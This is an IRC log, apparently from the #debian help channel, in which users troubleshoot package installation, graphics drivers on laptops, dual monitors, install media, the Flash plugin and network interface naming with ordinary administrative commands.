13:05  khem_: Is there any common case where you cannot access your Apache from remote, I got the server running, and listening at tcp        0      0 95.211.132.225:80       0.0.0.0:*               LISTEN      7831/apache2 and no iptables ruleset
13:05  stew: babilen: i don't believe apt knows if something is a metapackage,  I don't see how it would be any different
13:05  acemi: Bartzy: if you'll have only the default kernel, 256 is OK
13:05  khem_: it is the Debian apache2 package, with a configuration that's been customized
13:05  stew: babilen: or did you mean virtual package?
13:06  Bartzy: acemi: Say I'll have more.. each kernel 2-8MB ... that's a lot of kernels in 256mb :)
13:06  Bartzy: acemi: Also, mount options for ext3 ... should I just set the defaults, or use noatime and such ?
13:07  babilen: stew: I am not sure, but if e.g. "gnome" is pinned to, say, -100 and somebody issues "aptitude install gnome" would that change the set of installed packages?
13:07  abrotman: Bartzy: is there some special reason you want a separate /boot/ ?
13:07  Bartzy: abrotman: It just seems more organized.. that's not the general practice ?
13:08  acemi: I use ext4 for all my partition with noatime for my desktop machine
13:08  Zambezi: I got this error messages earlier when I tried to use mplayer, but it's still there after reboot: "Version mismatch detected between the NVIDIA libGL.so and libGLcore.so shared libraries (libGL.so version: 195.36.15; libGLcore.so version: 195.36.31).

13:08  Bartzy: acemi: ext4 is stable ?

13:08  Bartzy: squeeze.

13:22  DarkUranium: I've a question here... I've setup a vserver, but now I need to forward a subnet to it
13:22  bala`: babilen: Oh!. Then which package has it been put into ? Any info would be really great.
13:22  DarkUranium: the host computer has a number of IPs, the main IP assigned to it and a subnet for whatever tasks at hand -- what I need to do is keep the main IP directed at the computer, but redirect all subnet requests (let's call it 123.123.123.123/29) to a vserver

13:25  cronix: im kinda helpless here since the bluez wiki which is referenced kinda anywhere isnt existing anymore
13:26  Zambezi: How can I solve this problem in Squeeze? Version mismatch detected between the NVIDIA libGL.so and libGLcore.so shared libraries (libGL.so version: 195.36.15; libGLcore.so version: 195.36.31). Please try reinstalling the NVIDIA driver.
13:27  karthick87: icebrain: There is a long list here http://cdimage.debian.org/debian-cd/5.0.7/i386/iso-cd/
13:27  karthick87: icebrain: which one to download
13:28  icebrain: karthick87: will you have wired internet connection while installing Debian?

13:29  karthick87: icebrain: But i am confused in choosing the download
13:29  babilen: bala`: I can't find it in Lenny. Sorry.
13:29  icebrain: karthick87: yes, but do you connect to the internet through cable, or do you use wifi?
13:30  icebrain: karthick87: if you use wired, you should get the netinstall CD: http://cdimage.debian.org/debian-cd/5.0.7/i386/iso-cd/debian-507-i386-netinst.iso
13:30  babilen: karthick87: Are you installing it on a personal machine? If so, then I would recommend to install squeeze with the daily-built
13:30  Debian-sugar-vb: I used squeeze beta net install sucessfully with Virtualbox 3.2 OSX....
13:30  karthick87: I use wired connection

13:31  babilen: !tell karthick87 -about install squeeze
13:32  babilen: icebrain: I haven't used it, but a bunch of people in here reported success and it is time to test it. I am still not sure if #d has reached consensus on what to recommend and I tend to recommend Squeeze these days. (for personal laptops et al) *shrug*
13:33  abrotman: icebrain: it really shouldn't be broken at this point .. if it is, someone should be told that it's nto working correctly

13:36  Bennit: anyone know how to REALLY KILL a user
13:36  abrotman: slay
13:36  Bennit: slay doesn't work, can't kill it's processes
13:36  abrotman: !zombie
13:36  dpkg: A zombie process is one which has issued an exit(), but whose parent has not yet issued wait() (or one of its variants) to retrieve the exit code.  This usually means the parent process is buggy.  You can't kill a zombie, because it's already dead; you have to kill the parent, or just ignore the zombie.
13:36  Bennit: and w & htop crash when I call it
13:36  Guest95339: abrotman: in shell
13:36  Bennit: in top I can still see the processes
13:36  Bennit: top doesn't say they're zombies
13:36  icebrain: Guest95339: if you use Alsa (and not PulseAudio), you can do "amixer sset Master +10%"
13:37  bala`: babilen: BTW, Its available again in Squeeze. So, probably time for an upgrade :)
13:37  abrotman: Bennit: kill the PPID
13:37  icebrain: Guest95339: try "man amixer" too
13:37  babilen: karthick87: I would recommend using Squeeze's netinstall for your installation.
13:37  Guest95339: icebrain: thanks
13:37  abrotman: icebrain: probably should have started with man ...
13:37  babilen: bala`: Yes, it is available in Squeeze's coreutils
13:37  bala`: babilen: Yes, Thanks. I will start a dist-upgrade now.

13:39  bala`: babilen: Thanks again
13:39  babilen: karthick87: Ok, then you can download CD1 (the normal one for gnome, or one of the flavours) or DVD1 which will most likely contain anything you need. If you want *all* packages, you'll have to download the complete set.
13:39  zmitya: afuentes: maybe the virtualhost does not match with your request
13:40  afuentes: zmitya, what virtualhost?
13:40  zmitya: afuentes: the webserver at www.debian.org
13:40  afuentes: oh
13:40  karthick87: babilen: Can you give me the link for DVD1
13:40  karthick87: also CD1
13:41  bala`: karthick87: If you are somewhere around Chennai in India or Madurai in India, you can talk to the local GNU/Linux user groups. They will already have a copy of the CDs/DVDs
13:41  zmitya: afuentes: edit your hosts file and try telnet new_url 8080 where new_url is a valid hostname, which is known by the remote webserver
13:41  icebrain: karthick87: http://www.debian.org/CD/http-ftp/ has all the links
13:43  karthick87: thank you :)

13:44  bala`: karthick87: Please google for ilugc. Its a very active group with lots of debian users.
13:44  babilen: abrotman: I just realised the same thing. Argh, confusion!
13:44  bala`: karthick87: You can join the group and make a request in the mailing list. Some might have downloaded Squeeze as well.
13:44  bala`: karthick87: *Someone

13:48  bonjoyee: any news about the lcd cleartype fonts patch coming to debian?
13:49  babilen: karthick87: One second please.
13:49  bonjoyee: heard that some patent preventing it ..expired/expires soon!!
13:50  abrotman: bonjoyee: do you have a reference for that ?
13:50  muddd:  
13:51  abrotman:  
13:51  abrotman: winfix: uh what?
13:51  zmitya: afuentes: lets assume that you have your tunnel already... then do: echo "127.0.0.1 www.debian.org" >> /etc/hosts
13:52  bonjoyee: @abrotman: http://www.freetype.org/patents.html
13:52  zmitya: afuentes: after this you can do wget http://www.debian.org:8080
13:52  abrotman: bonjoyee: i meant a Debian reference
13:52  winfix: abrotman: yes ..2gb of downloads ... I put it last night and when to sleep
13:53  mavhk: that's truetype, not cleartype
13:54  Trewas: bonjoyee: I think the patch is already included in the debian package, software patents are usually ignored in debian unless the patent holder actively whines
13:54  mavhk: http://david.freetype.org/cleartype-patents.html
13:57  bonjoyee: Trewas: is doesn't look like the patch is applied..as the fonts on debian are quite 'rough' than they were on ubuntu
13:58  Trewas: bonjoyee: hmm could be I was thinking about the ubuntu package

14:14  abrotman: khem_: see what the bot told you
14:14  JasonWoof: there's a gnome-core update on unstable that requires me to install evolution, totem, gnome-screensaver and a bunch of other crap I don't use or want. Is there a way around this?
14:14  khem_: abrotman: oh thankyou. that was much more useful solution
14:15  khem_: efficent*
14:15  JasonWoof: or should I just get over it and install all that stuff?
14:15  abrotman: JasonWoof: it appears to be a depends
14:15  icebrain: JasonWoof: do you really need gnome-core? I think it's just a meta-package
14:15  abrotman: it is just a meta, but it's easier than picking and choosing
14:16  abrotman: he could just install gnome-panel, gnome-session, etc .. but gets kind of irritating
14:16  JasonWoof: they just became depends, they used to be in gnome-desktop-environment

14:19 --- debhelper sets modes [#debian +l 939]
14:19  JasonWoof: I find it odd that they're making gnome fit on a CD (making it smaller) makes gnome bigger on my machine
14:20  JasonWoof: ok, I guess I'll just install it all. I just wanted to know if there was something fairly easy, like a gnome-minimal meta package or something
14:21  bonjoyee: how to integrate things in /opt/lib or /opt/bin with the entire system/for all users
14:21  abrotman: JasonWoof: sadly, that's supposed to be the minimal one
14:21  JasonWoof: abrotman: I thought so, it's sad that it just got a lot less minimal
14:22  abrotman: JasonWoof: you could complain in #debian-gnome on irc.oftc.net .. but i doubt you'll sway them
14:23  JasonWoof: abrotman: yeah, I'm sure it's been discussed, and if there's any swaying to be done, it'll be by people more known/connected/respected than me

14:25  khem_: abrotman: Too bad, it did not work :-(
14:25  abrotman: khem_: you probably used the wrong package name
14:25  abrotman: which one did you try?
14:26  khem_: abrotman: dpkg --purge apache2 && aptitude -o DPkg::Options::="--force-confmiss" install apache2
14:27  khem_: oh maybe its something like apache2-common or similar that holds the confs
14:27  khem_: (I did remove the conftree by hand too)
14:27  abrotman: it's apache2.2-common .. i said above that 'apache2' was the wrong package
14:28  abrotman: and you don't need to purge the package
14:28  abrotman: read what the bot told you
14:28  khem_: oh, sorry :)

14:33  Bartzy: squeeze.
14:33  abrotman: Bartzy: and you should probably be using aptitude
14:33  Bartzy: tried that as well
14:34  Bartzy: When I try to add my repository to a new computer, and do aptitude update, then aptitude show my_package, then version 1.1 (the new one) shows
14:34  Bartzy: but on my own computer, when doing that. I see version 1.0 .
14:35  daemonkeeper: Sure your repository has the most recent meta data?
14:36  Bartzy: yes, and as I said it works on another computer...
14:38  daemonkeeper: Well, the process for finding updates is another one rather than to fetch the whole repo metadata. But don't ask me in detail, I'm not that deep in Debian repository maintenance.
14:38  Bartzy: when looking at my "Packages" file of the repo
14:38  Bartzy: both versions appear..

15:34  Bartzy: KaffeeJunky123: I have a screen called DP1 (internal laptop screen) with 1366x768 resolution, and a Dell 19" external screen , 1280x1024, connected via VGA...
15:34  Bartzy: didn't configure anything, just tried to use "Monitors" in Gnome and xrandr without much luck :|
15:35  Bartzy: I just want regular clone screen, one in 1280x1024 (external) and one in 1366x768 (internal)
15:35  KaffeeJunky123: Bartzy: paste the parts of xorg.conf that contains the configuration for your monitors to some pasting site eg pastie.org
15:36  Bartzy: KaffeeJunky123: OK, but I didn't change it...
15:36  stew: sounds like he might not have an xorg.conf
15:36  Bartzy: and Where do I find my xorg.conf ? It's not been replaced by some weird gnome thingie ?
15:36  stew: Bartzy: /etc/X11 if it exists at all
15:36  OpenTokix: Bartzy: normaly you dont need one, but as stew said
15:36  Bartzy: how X works if it doesn't exist ?
15:37  OpenTokix: Bartzy: it autodetects everything
15:37  Bartzy: btw, xrandr hangs the system a lot...
15:37  KaffeeJunky123: stew: doesn't that gnome monitor tool write to xorg.conf?
15:37  Bartzy: no xorg.conf
15:37  stew: KaffeeJunky123: no idea.  i certainly doubt it
15:38  Bartzy: actually xrandr --output VGA1 --off (to disable external screen), and xrandr --output VGA1 --auto' (to enable it) seems ok, but
15:38  Bartzy: *seems ok, but xrandr hangs the system from time to time :|
15:39  Bartzy: how can I do a conditional command, where if grep finds something, do command1, if it doesn't, do command2.. but I prefer no 'if' and just && ?

15:48  Bartzy: stew: It's so weird that the clone doesn't work.. it's like the resolution of each monitor is still the normal resolution, but the size of the screen (and the panels) is determined by the primary screen (external)
15:49  Bartzy: so the panels are not finishing at the end in the internal screen, and I can't see the bottom in the internal screen..
15:49  stew: khem_: none are needed, depending on your configuration
15:51  andreas122: how i can check if 'ath5k' is installed?

15:51  Bartzy: I think this fixes my problem.. but how can I patch my gnome
15:51  Bartzy: it's a package

15:56  icebrain: andreas122: so, if you have Lenny, ath5k is already in your kernel
15:56  abrotman: it is mildly buggy in lenny's kernel, the bpo kernel has much better ath5k

17:14  stew: caraconan: you'd have to edit the wireshark source package in order to create your own version of the package which didn't include all of wireshark

17:22  _sho_: when the machine boots, the interface starts properly
17:22  cahoot_: !70
17:22  dpkg: udev has the ability to statically rename Ethernet cards based on MAC address since version 0.090.  The addresses are configured in /etc/udev/rules.d/70-persistent-net.rules (Lenny, Squeeze) or /etc/udev/rules.d/z25_persistent-net.rules (Etch).  If you want the mappings to change, edit the respective file.  To apply changes: "udevadm trigger" ("udevtrigger" on Etch) or reload the relevant driver module.  See also <forcedeth mac>, <udev>.
17:22  jelly: Bartzy: my i915GM works reasonably well, some minor Render (antialiased fonts) bugs here and there
17:22  _sho_: after, even if i use eth4 in interfaces, when i do a networking stop/start, it will  not restart the interface
17:23  dkr: _sho_: edit /etc/udev/rules.d/70-persistent-net.rules
17:23  caraconan: I have to install whole wireshark to get dumpcap?
17:23  _sho_: dkr: even after editing said file, after boot, networking stop/start will never bring back the interface
17:23  dkr: caraconan: it's in wireshark-common package
17:23  _sho_: i have to ifup it manually
17:23  stew: caraconan: you could install wireshark-common only
17:24  caraconan: ...same suggested packages. It's to a server without X. I am trying installing tcpdump
17:25  _sho_: something is starting the interface as eth0, then changing it to eth4 (udev), then changing it back.
17:25  Bartzy: jelly: It's a graphics adapter inside an i5 CPU (mine)... It works better on 2.6.36, the problem is mainly dual displays (clone)
17:25  rahsputin: caraconan, stew when i # apt-get install pcaputils:  The following NEW packages will be installed:
17:25  rahsputin:   libjudydebian1 pcaputils
17:25  rahsputin:   shows, no wireshark
17:25  stew: caraconan: "aptitude install wireshark-common --without-recommends"
17:25  Bartzy: I'm experiencing some flickering (for only 0.5 sec), every 2-5 minutes... how can I even debug this ? :\
17:25  rahsputin: and i dont have wireshark installed
17:25  llutz: caraconan: aptitude install wireshark-common -R
17:26  stew: rahsputin: if you want to install wireshak, "apt-get install wireshark"
17:26  jelly: Bartzy: that sounds like a power saving bug.
17:26  caraconan: <rahsputin> installing pcaputils you will not get dumpcap command

17:34  Bartzy: jelly: OK, I'll try to add powersave=0, but where ?
17:34  Bartzy: thanks stew.
17:35  jelly: Bartzy: it's a kernel module option, so, anywhere in /etc/modprobe.d/ -- you can make a custom file or use one already present, esp. if there's one that already gives i915 some options
17:37  Bartzy: jelly: so 'options i915 powersave=0 ' ?
17:38  jelly: Bartzy: right
17:39  Bartzy: thanks, I'll try it.. Does that mean that power saving won't work only for the GPU? Display will still get off and brightness will be adjusted as I configured ?

18:10  jhutchins_lt: Bartzy: As above, disable with nomodeset.  X will fail, hopefully leaving you at a console, or use nomodeset single
18:11  Bartzy: KaffeeJunky123: The recovery mode works until some point, where X probably get started and then I must hard reboot...
18:11  jhutchins_lt: KaffeeJunky123: Dunno if you can force vesa mode or not, there's no automatic fallback.  You'd probably need to set it up in xorg.conf.
18:11  Bartzy: jhutchins_lt: I'll try that.
18:12  jhutchins_lt: KaffeeJunky123: Unfortunately my test system lost it's hard drive.
18:12  KaffeeJunky123: jhutchins_lt: squeeze is in freeze btw and it's working rather stable for me, some stupid bugs though because I upgraded from lenny
18:13  Bartzy: it makes it really hard to use debian for this laptop... On the one hand I can't use lenny because a lot of the packages are old... on the other hand squeeze has so much problems with laptops...
18:13  KaffeeJunky123: jhutchins_lt: I can't seem to get the update-notifier thing to work ^^
18:13  icebrain: jhutchins_lt: but isn't Xorg for graphics anyway? Why does it matter if you can't start Xorg without KMS?
18:13  Bartzy: jhutchins_lt , adding 'nomodeset single' won't help - the laptop is still getting into a black screen after a while of booting.
18:13  KaffeeJunky123: Bartzy: try the failsafe boot option
18:14  Bartzy: KaffeeJunky123: Won't work. This is a new installation...
18:14  haxi__: hi here :)
18:14  jhutchins_lt: Bartzy: what about just nomodeset?
18:14  KaffeeJunky123: Bartzy: didn't it work a few hours ago?
18:14  Bartzy: I can't get into the system with GUI because something is "ruined".. I know how to fix it (change /bin/sh to bash instead of dash... weird stuff), but I can't do that because I can't get into single mode!!
18:14  Bartzy: KaffeeJunky123: The GUI worked, I ruined it a bit, trying to fix something... I only need a shell for 2 secs :p
18:15  KaffeeJunky123: Bartzy: what did you do?
18:15  Bartzy: KaffeeJunky123: I don't know exactly why it happens, it's something in some scripts my company uses...
18:16  Bartzy: jhutchins_lt: That just brought up gnome
18:16  Bartzy: omg this is so annoying
18:17  jhutchins_lt: Bartzy: Really?  So you got X working.
18:18  Bartzy: jhutchins_lt: Yes, it's working, but when I login it comes back to the login screen everytime. For some reason, it's because /bin/sh is directed to dash instead of bash. dunno why. But I can't get a shell to change that symlink.
18:18  Bartzy: I just booted up with knoppix to change that symlink
18:18  Bartzy: I can't believe I actually can't get into single mode to fix stuff up....
18:19  jhutchins_lt: I would strongly suggest you drop back to lenny.  Newer is not always better.
18:19  jhutchins_lt: Bartzy: I'm checking on some details...
18:19  Bartzy: lenny should work fine ?
18:19  eft: in the linux directory structure is there a recommended dir to store local backups ie should I create \backups or use \var or something else?
18:19  eft: this is for database dumps that will be created by cron under root user
18:19  Bartzy: jhutchins_lt: Thanks. what details if I may ?
18:20  dkr: eft: /var does make sense since it is data likely to change often
18:20  dkr: eft: in fact dpkg and aptitude use /var/backups/
18:21  jhutchins_lt: How to get single mode
18:21  Bartzy: jhutchins_lt: Thanks :p
18:21  Bartzy: jhutchins_lt: It's weird because I don't see the whole text part boot process of the kernel.. even when 'quiet' is not in the boot options...
18:22  Bartzy: I see text for 2 sec, than for 5-6 sec the screen is black until gnome is up
18:22  eft: dkr: thanks for the suggestions; so do you think I could piggyback onto /var/backups or should I create /var/db_backups ?
18:22  eft: splitting hairs maybe
18:22  jhutchins_lt: Bartzy: That's pretty much what I get (mine works when it's up though).
18:23  jhutchins_lt: Bartzy: I think if you turn off "splash" and/or "quiet" that fixes it.
18:23  dkr: eft: if backing up as root you coudl throw themin /var/backups.  if a specific user you might want to create a dir owned by thatuser
18:23  jhutchins_lt: Bartzy: Dunno why you can't get single mode though - space seperation of the options is correct.
18:23  eft: dkr: ok thanks again
18:24  jhutchins_lt: Bartzy: You might try nosetmode single and remove quiet and splash.
18:24  chrissbx: (Hm, I've got a laptop with intel graphics but haven't run into this yet, although my last reboot was 7 days ago. I'm suffering from random switchery of internal vs. external monitor settings, wondering if that's related.)

18:26 --- jhutchins_lt is now known as jhutchins_ltel
18:26  jhutchins_ltel: One of the problems is that the integrated Intel graphics are not always implemented exactly the same way.
18:26 --- jhutchins_ltel is now known as jhutchins_lt
18:27  jhutchins_lt: I had problems similar to Bartzy with an 855GM.
18:27  chrissbx: So I should probably report it. I wish I wouldn't spend all day either fiddling with computers or surfing the net...

18:29  chrissbx: I've got an issue that the keyboard doesn't work in gpm, btw, so I'm always starting X with startx.
18:30  chrissbx: gdm
18:30  jhutchins_lt: chrissbx: gdm you mean?
18:30  chrissbx: (Also same problem in kdm iirc.)
18:30  jhutchins_lt: chrissbx: I know kdm has it's own rc file, perhaps gdm does as well and you can set something there.
18:31  Bartzy: jhutchins_lt: Thanks a lot for your help.
18:31  jhutchins_lt: Bartzy: Good luck with it.
18:31  Bartzy: thanks :p
18:31  Bartzy: I was starting to think I'll just install Windows and install a powerful VM (virtualbox or something) with debian inside...

18:32  jhutchins_lt: Indeed.
18:32  jhutchins_lt: I don't have any trouble with the lenny systems I run, they all work great.
18:33  Bartzy: One last question I hope: Some commands (running in gnome-terminal), like aptitude, are weird on their output... the output is only 1 line long sometimes.. like aptitude update...
18:33  jhutchins_lt: Bartzy: I see that here too.  (On squeeze only)
18:33  Bartzy: and the line gets deleted and rewritten a lot ..
18:34  jhutchins_lt: I don't know if really disabling the framebuffer would fix that or not.
18:34  chrissbx: (I'm using urxvt, because I use terminals a lot and found this to be more satisfying in general.)
18:34  Bartzy: jhutchins_lt: What you're saying about squeeze is very weird. I'm talking to you from a squeeze machine that I run for over a year.. it has intel graphics (desktop motherboard), never had an issue with console, single mode or whatever, and aptitude output works as expected.. how can you explain that ?
18:34  jhutchins_lt: That's why squeeze is still testing.
18:35  Bartzy: jhutchins_lt :(
18:35  jhutchins_lt: People who say "oh it runs fine for me" think that means something - it doesn't, it just means you're ignorant of the existing problems that other people have.
18:35  Bartzy: jhutchins_lt: You're running lenny on your desktop machines ? It's not 'old' packages-wise ?
18:35  jhutchins_lt: Not in any way that affects my work.
18:36  Bartzy: I run lenny on my server, I have to compile stuff from time to time.. that's annoying...
18:36  Bartzy: Annoying not because I have to compile, but because I have to compile and there's a package for it for squeeze and up
18:36  jhutchins_lt: Everything I had compiled in the past has been removed or replaced with standard packages.  I run a few things from backports.
18:37  Bartzy: jhutchins_lt: You're running 32-bit ? lenny will run with 2.6.36 kernel (I need to use it for some Intel graphics weirdness with monitors) ?
18:37  jhutchins_lt: Yes, 32bit all around, servers and desktops (and ltsp).
18:38  jhutchins_lt: I have the .32 kernel on one desktop, and I have to boot back to .26 to see my scanner.
18:39  jhutchins_lt: Newer, as I said, is not always better.

18:49  derik: chrissbx random time :D
18:49  daemonkeeper: derik:  While I don't see the reason to do that, you could run a cron job every n time units which does nothing but randomly something.
18:49  chrissbx: No idea then :). (I'd probably run a loop with sleep $random_time instead)
18:50  daemonkeeper: e.g. Call a script which does if (random_condition) { do_sth() } else { exit }

But eveything else just craps down on me. Chrome, totem, everything just gets slow. Even when I set the lowest priority on gns3
19:26  daemonkeeper: That's not a Debian problem, that's a known problem of dynamips (the IOS emulator) who needs to guess when to idle the CPU
19:26  vtts: leafwiz, how do you set the lowest prio?
19:27  leafwiz: vtts, I nice it to 15
19:27  vtts: have you tried cgroups?
19:27  daemonkeeper: Ask Google about workarounds. Basically you have to tell dynamips when it can idle the CPU, out of box it doesn't know when to sleep
19:27  leafwiz: vtts, what is that?
19:28  vtts: leafwiz, http://www.kernel.org/doc/Documentation/cgroups/cgroups.txt

19:59  JordiGH: Спасибо!
19:59  SlayerXP: JordiGH: also google "unetbootin"
20:00  stew: it seems that with SOME bios you can just copy the iso directly to the usb.  with SOME people perhaps unetbootin works.  the more involved procedure in the i-g is more likely to work if you can bother to follow it

20:01  crono-: find /etc -type f -name xorg.conf ?
20:01  stew: that's silly
20:02  crono-: apt-get install xorg then ;)
20:02  razieliyo: doesn't find anything
20:02  stew: its going to be in /etc/X11 if anywhere, but its no longer needed most of the time
20:02  razieliyo: crono-, it's installed
20:02  razieliyo: and there's no xorg at /etc/X11
20:02  stew: razieliyo: you can create one if you need/want one.  most people shouldn't need one
20:03  razieliyo: I see, I would want it because I'm having problems with nvidia
20:03  razieliyo: I think my card (Gforce 5500) is too old
20:03  razieliyo: I'll try with legacy drivers from the repositories
20:03  stew: razieliyo: are you using the free drivers or the non-free drivers?
20:03  razieliyo: stew, I don't know, I just did module assistant
20:04  razieliyo: I think free one
20:04  stew: razieliyo: that's non-free
20:04  razieliyo: nice

20:04  razieliyo: free or nonfree
20:04  jhutchins_lt: razieliyo: That's what I have on my lenny desktop system.  Didn't need to do anything special to set it up.
20:04  stew: razieliyo: better in what sense?
20:04  razieliyo: stew, better = less problems
20:05  razieliyo: stew, easier to install, faster maybe
20:05  stew: doing what?
20:05  jhutchins_lt: razieliyo: nv driver.
20:05  stew: free, non-free
20:05  jhutchins_lt: Non-free drivers have no advantage on that card.

20:08  jhutchins_lt: I do have an xorg.conf...
20:08  razieliyo: I don't, this is a mess
20:09  stew: razieliyo: the free drivers don't have any hardware accelleration for nvidia, afaik
20:09  razieliyo: so I would have to use nonfree
20:09  razieliyo: and if I have no xorg.conf, how can I select my driver?

20:11  razieliyo: I don't know why I don't have a xorg.conf
20:11  razieliyo: I'll google a bit
20:11  jhutchins_lt: razieliyo: Mine is at the pastbin above.
20:12  razieliyo: yes, but I think it will fit your computer, so I don't know if I should copy it
20:12  stew: razieliyo: you don't have one because you shoulnd't need one
20:13  JordiGH: Do I zcat boot.img.gz to /dev/sdb or to /dev/sdb1 ?
20:13  JordiGH: assuming sdb is my pendrive, and yes, it is.
20:13  JordiGH: Wouldn't it be lolsy if I wiped my hard drive instead...
20:13  stew: JordiGH: there are instructions in the install guide
20:14  jhutchins_lt: razieliyo: I have the same chipset.
20:14  JordiGH: I don't understand them. They say "/dev/sdX"
20:14  stew: JordiGH: that would be /dev/sdb
20:14  JordiGH: Okay.
20:14  stew: JordiGH: it would tell you to do one way for the "simple" method, and another (/dev/sdb1) for the more flexible method, or something
20:14  qwd: JordiGH: I know someone already mentioned it and maybe you have a reason not to use it but Unetbootin is easy to use.
20:14  stew: unetbootin is easier and sometimes works
20:15  stew: copying the .iso to the drive directly is easier and sometimes works
20:15  stew: what he is doing is more involved and will work if either of the two above would possibly work
20:15  JordiGH: Well, looks like I managed to not overwrite my hard drive, so that's something.

20:22  xuzas: hi everyone!
20:22  stew: you are running 1.0.15 ; 2.3+lenny1 is the debian revision,  it roughly means that the maintainer made 2 different uploads, there were then 3 subsequent non-maintainer uploads which were revisions of that maintainer upload, then there was one security update to lenny of that

20:23  ericpersson: thanks vtts and stew
20:24  qwd: k_1: I'm not sure but openssh has the subserver sftp option (or whatever it's called) now so I don't *think* ericperssons way is the best. I'm guessing you should just set it up as a strictly sftp server, and have the permissions so you can upload files, then just use rsync from the computer you're using.

20:27  jhutchins_lt: xuzas: What kind of videos?  What have you tried to get them to play?
20:27  ericpersson: qwd: you wont be able to rsync with only sftp though..
20:28  xuzas: well, videos in .avi and .flv format, just like always with totem
20:28  ericpersson: k_1: if sftp is fine, there is a chroot option in newer openssh, so you can limit their sftpsession so they are not able to browse files outside their homedir
20:28  Tony2992: jhutchins_lt, tried that but still the browsers is showing me that I have 9.x install instead of 10 This is in a manual install of firefox since I was unable to find an automatic way to install it, I think I am missing the pointing to the plugins path, the questions is which one.
20:28  qwd: ericpersson: really? I would have thought you could just mount it and tell rsync to send the files to that folder? then again I hadn't used rsync until I installed Grsync yesterday :)
20:28  jhutchins_lt: Tony2992: aptitude install iceweasel
20:29  k_1: qwd: see, I'm setting up a wikileaks massmirror http://wikileaks.under.ch/mass-mirror.html
20:29  Tony2992: qwd, since I was unable to install firefox from apt-get, i download the package manually from firefox.com and extracted and run it from a icom in the desktop. I know that is the wrong way to do it but I was unable to do it automatically using the apt-get
20:29  jhutchins_lt: xuzas: mplayer works for me.
20:29  k_1: rsync over ssh
20:29  stew: Tony2992: firefox is named 'iceweasel' in debian
20:29  ericpersson: qwd: mm, you mean mount it over sftp and then rsync "locally", that might work..
20:30  ericpersson: qwd: i would expect it to be less efficient though..
20:30  jhutchins_lt: Tony2992: flashplayer-plugin installed 10 for me on lenny.
20:30  Tony2992: jhutchins_lt iceweasel comes with Debian, can I have firefox as well.
20:30  jhutchins_lt: Tony2992: The only difference is that the icon and title have been changed.
20:30  jhutchins_lt: Tony2992: Same code.
20:30  qwd: Tony2992: that's why you should always give as much info as possible, and not just ask how to do something, many times the solution you think it right isn't :) Iceweasel IS Firefox, no need for both.
20:30  xuzas: Tony2992, it's just the same

20:31  xuzas: before installing the original drivers for my gma500 everything used to work
20:31  xuzas: but in a wrong resolution and a bit slow
20:31  razieliyo: now just a question, after making some changes, I could see the console (ctrl+alt+f1) in a great resolution, but now it has gone down, can I change this?
20:31  Tony2992: xuzas, Currently I see Webbrowser 2.22.3 within Debian,whyc an they include firefox like in ubuntu.
20:31  qwd: k_1: Ah, maybe my way wouldn't work for that then. Kudos for mirroring wikileaks though :)
20:32  jhutchins_lt: !why iceweasel
20:32  dpkg: Due to Mozilla logos licensing, Mozilla software isn't DFSG-free, so Debian distributes Mozilla software with different logos.  One day Mozilla Corporation decided to revoke the agreement to let Debian use Mozilla trademarks, so Debian changed to non-trademarked product names.

20:33  Tony2992: qwd, but by default in Debian I am looking at something call "Web browser 2.22.3" can I do apt-ge install iceweasel?
20:33  razieliyo: xuzas, you mean console resolution problem?
20:34  xuzas: not console resolution; general screen resolution

20:35  xuzas: it was really easy, i just followed one of the links he shared with you
20:35  jhutchins_lt: haxi__: What is the wireless chipset?
20:35  Tony2992: stew, I wonder why debian decided to do epipahny by default in the panel.

20:36  jhutchins_lt: Tony2992: Epihany is part of gnome.

20:37  Tony2992: jhutchins_lt , ohhh ok. ok so I launched iceweasel but it still showing me flash version 9.x, I need to update to 10.x, how cna I do it?
20:38  haxi__: I think I should update my kernel first. (2.6.26)

20:41  Tony2992: stew, as long as its the latest and works with something I want to play either one will work I guess
20:41  razieliyo: qwd, yes, there's some vga= option at the startup
20:41  razieliyo: but it doesn't do nothing for me
20:41  stew: Tony2992: if you need flash v10, perhaps non-free is the only way it will work

20:50  Tony2992: razieliyo , what is it you want to do?
20:50  jhutchins_lt: Tony2992: Same as you already have, just add contrib (and non-free if you want it) after "main".
20:50  Tony2992: jhutchins_lt got it
20:51  razieliyo: Tony2992, I want to give more resolution to the framebuffer
20:51  jhutchins_lt: Tony2992: Looks like the installer is in contrib, because as I said it's just a script.

20:53  stew: razieliyo: when did the font change?
20:54  razieliyo: I had to do 2 things, one, edit the grub.cfg and two, dpkg-reconfigure console-setup and set the font to terminus bold

21:42  acemi: stew: you are right, this is my fault

21:42  KaffeeJunky123: didn't see that
21:43  stew: KaffeeJunky123: yes, they are having him install a .so directly into his home directory instead of using the packages from debian

21:56  acemi: 64-bit package is not for your system
21:57  thewanderer1: Tony2992: perhaps Iceweasel is loading the plugin from a place you don't want it to load it
21:58  Tony2998: acemi I even try installing the 64-bit using the same method you describe, when I launched iceweasel it continues to complain that I am using version 9.x

22:00  cast: /etc/rc.local is one option
22:01  LeetDog1337: alright thanks
22:01  stew: LeetDog1337: what commands?  there might be a better place
22:02  acemi: Tony2998: how did you install flash 9.*
22:02  LeetDog1337: alias
22:02  stew: LeetDog1337: in your .bashrc (asuming you are using bash)
22:02  LeetDog1337: oh ok.
22:02  LeetDog1337: thanks
22:02  Tony2998: acemi , can you paste the entire line again, i lost it when irc disconected me
22:02  stew: LeetDog1337: it doens't make sense to run that at boot, it makes sense to run that when you shell starts

22:03  stew: LeetDog1337: (especially since that isn't a command, its a shell builtin, and only lasts for the duration of that shell)
22:03  LeetDog1337: o
22:03  jhutchins_lt: Tony2998: You need to figure out where the flash 9 is being loaded from.

22:03  jhutchins_lt: Tony2998: You are well on the way to having an umaintainable system if you keep trying different methods.
22:04  Tony2998: jhutchins_lt I guess it was loaded in the box by default for iceweasel.
22:04  jhutchins_lt: Tony2998: No.
22:04  stew: yes
22:04  jhutchins_lt: Tony2998: You had to install it somehow.
22:04  stew: i'm going to guess it was via "tasksel insatll desktop"
22:04  Tony2998: jhutchins_lt I am trying
22:04  stew: (run by the installer for him)
22:05  jhutchins_lt: Tony2998: Does dpkg -l | grep flash show a flash package installed?
22:06  Tony2998: jhutchins_lt , yeah "ii  flashplayer-mozilla                  2:10.1.102.64-0.0          Macromedia Flash Player
22:07  LeetDog1337: btw guys, is there any mod for links?(Graphical version) to display images :/?
22:07  stew: LeetDog1337: links2 -g
22:07  LeetDog1337: yeah stew
22:07  LeetDog1337: but that doesnt display images :O?
22:08  stew: LeetDog1337: it does for me
22:08  razieliyo: I have two removable hdd, so, can I setup fstab to mount whichever of them both when they're plugged in?
22:09  LeetDog1337: stew: does it support css btw?
